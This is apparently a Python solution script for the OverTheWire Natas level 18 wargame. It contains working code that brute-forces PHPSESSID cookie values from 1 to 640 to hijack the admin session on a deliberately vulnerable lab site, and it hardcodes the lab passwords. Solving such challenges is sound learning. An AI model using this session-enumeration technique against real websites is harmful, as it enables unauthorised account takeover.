import requests
import bs4
import re


# configuration for natas18
USERNAME = 'natas18'
PASSWORD = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'
URL = 'http://natas18.natas.labs.overthewire.org/'
AUTH = requests.auth.HTTPBasicAuth(USERNAME, PASSWORD)


session = requests.Session()
session.auth = AUTH
# get the challenge content
response = session.get(URL)
div_content = bs4.BeautifulSoup(response.text, 'html.parser').body.find('div', {'id' : 'content'})
print(f'{div_content}\n')


# get the source code
response = session.get(URL + 'index-source.html')
# print(response.text)


"""
In the source code, there's a global variable called $maxid=640.
Also, each user is assigned a numerical id between 1 and 640 (inclusive)
(reference: https://www.php.net/manual/en/function.rand.php)
using the createID() function.
This user id is then assigned to the cookie PHPSESSID.
It seems that the admin has one of the ids, but we don't know which one yet.
For example,
"""
data = {
    'username' : 'randomusername',
    'password' : 'randompassword',
    'submit' : 'submit'
}
response = session.post(URL, data=data)
# prints out any number between 1 and 640 for PHPSESSID
print(f'Cookies: {response.cookies}\n')


# therefore, we need to try every id in the range of 1 and 640 inclusive
# to find the admin id
# then, we can get the page displayed only to the admin
MIN = 1
MAX = 640
admin_page = None
for i in range(MIN, MAX+1):
    print(f'Current id: {i}', end='\r')
    # put the id as the PHPSESSID cookie
    requests.utils.add_dict_to_cookiejar(session.cookies, { 'PHPSESSID' : str(i) })
    # send post request with the dummy data
    response = session.post(URL, data=data)
    if re.search(r'You are an admin.', response.text):
        print(response.text)
        admin_page = response.text
        break

# natas19 password: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs
password = re.search(r'Password: (\w+)', admin_page)[1]
print(f'natas19 password: {password}')